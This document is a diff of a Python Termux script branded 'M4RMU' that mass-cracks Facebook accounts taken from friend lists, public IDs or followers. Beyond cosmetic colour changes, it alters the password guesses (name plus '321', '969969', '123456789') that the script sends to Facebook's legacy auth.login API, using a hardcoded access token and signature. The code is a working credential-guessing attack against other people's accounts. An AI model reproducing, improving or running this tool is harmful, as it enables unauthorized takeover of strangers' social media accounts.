@@ -68,18 +68,18 @@ c2 = "\033[0;97m"
  
 c3 = "\033[1;91m"
  
-logo = """                                          .88b  d88. d88888D 
+logo = """ \033[1;95m                                          
 88'&  &`88      88'&  &`88
 88  °°  88      88  °°  88    
 88  88  88      88  88  88
 88  88  88      88  88  88
-YY  88  YY  <.> YY  88  YY     
+YY  88  YY  <.> YY  88  YY\033[1;94m    
                                
 ==================[{M4RMU}]======================
 \033[1;96m    FACEBOOK   : TECHNOLOGY BY M4RMU
  \033[1;96m    AUTHOR    : M4RMU
  \033[1;96m    GITHUB    : B4BY DR4G0N 
- \033[1;96m   TELEGRAM   : TERMUX MY4NM4R TEAM　
+ \033[1;96m   TELEGRAM   : TERMUX MY4NM4R TEAM\033[1;94m
 =================================================="""
  
 def main():
@@ -142,19 +142,19 @@ def login():
  
     print("")
  
-    print("\033[0;92m[ Login Menu ]").center(50)
+    print("\033[0;93m[ Login Menu ]").center(50)
  
     print("")
  
-    print("\033[1;97m[1]\033[1;97mLogin Using Token")
+    print("\033[1;97m[1]\033[1;92mLogin Using Token")
  
     print("")
  
-    print("\033[1;97m[2]\033[1;92mHOW TO GET FB TOKEN?")
+    print("\033[1;97m[2]\033[1;94mHOW TO GET FB TOKEN?")
  
     print("")
  
-    print("\033[1;97m[3]\033[1;91mBack")
+    print("\033[1;91m[3]\033[1;91mBack")
  
     print("")
  
@@ -162,7 +162,7 @@ def login():
  
 def login_select():
  
-    Mz = raw_input(" \033[1;97m Choose Option :\033[1;96m ")
+    Mz = raw_input(" \033[1;96m Choose Option :\033[1;95m ")
  
     if Mz =="1":
  
@@ -201,8 +201,7 @@ def login_select():
             time.sleep(1)
  
 	    os.system("xdg-open https://youtube.com/channel/UC46yPQG_lrQfAKrKof0iBdw")
-	
- 
+	 
 	    time.sleep(1)
  
             menu()
@@ -300,28 +299,17 @@ def menu():
  
     print logo
  
+    print("") 
+    print("\t\033[1;92mActive Token.... : " +nm) 
+    print("") 
+    print("\033[1;97m[1]\033[1;93mCrack From Friendlist")
+    print("") 
+    print("\033[1;97m[2]\033[1;92mCrack From Public id") 
     print("")
- 
-    print("\t\033[1;92mActive Token.... : " +nm)
- 
-    print("")
- 
-    print("\033[1;97m[1]\033[1;92mCrack From Friendlist")
- 
-    print("")
- 
-    print("\033[1;97m[2]\033[1;92mCrack From Public id")
- 
-    print("")
- 
-    print("\033[1;97m[3]\033[1;92mCrack From Followers id")
- 
-    print("")
- 
-    print("\033[1;97m[0]\033[1;97mDAFA KAR")
- 
-    print("")
- 
+    print("\033[1;97m[3]\033[1;91mCrack From Followers id") 
+    print("") 
+    print("\033[1;97m[0]\033[1;97mMain Menu") 
+    print("") 
     menu_select()
  
 def menu_select():
@@ -470,11 +458,10 @@ def menu_select():
  
 	print("[#] Please Wait A minute.....")
  
-	print 47*("-")
+	print 47*("=")
  
 	print('')
- 
-	
+ 	
  
 	def main(arg):
  
@@ -586,7 +573,7 @@ def menu_select():
  
 		                        else:
  
-		                            pass4=name+"786"
+		                            pass4=name+"321"
  
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
  
@@ -620,7 +607,7 @@ def menu_select():
  
 		                                else:
  
-		                                    pass5="786786"
+		                                    pass5="969969"
  
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
  
@@ -688,7 +675,7 @@ def menu_select():
  
 		                                                else:
  
-		                                                    pass7="Pakistan"
+		                                                    pass7="123456789"
  
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
  
@@ -736,7 +723,7 @@ def menu_select():
  
 	print (" ")
  
-	print (47*"-")
+	print (47*"=")
  
 	print ("[!] Process has completed")
  
@@ -744,7 +731,7 @@ def menu_select():
  
 	print (47*"-")
  
-	raw_input("\t\x1b[0;97mPress enter to main menu back")
+	raw_input("\t\x1b[0;96mPress enter to main menu back")
  
 	menu()
  
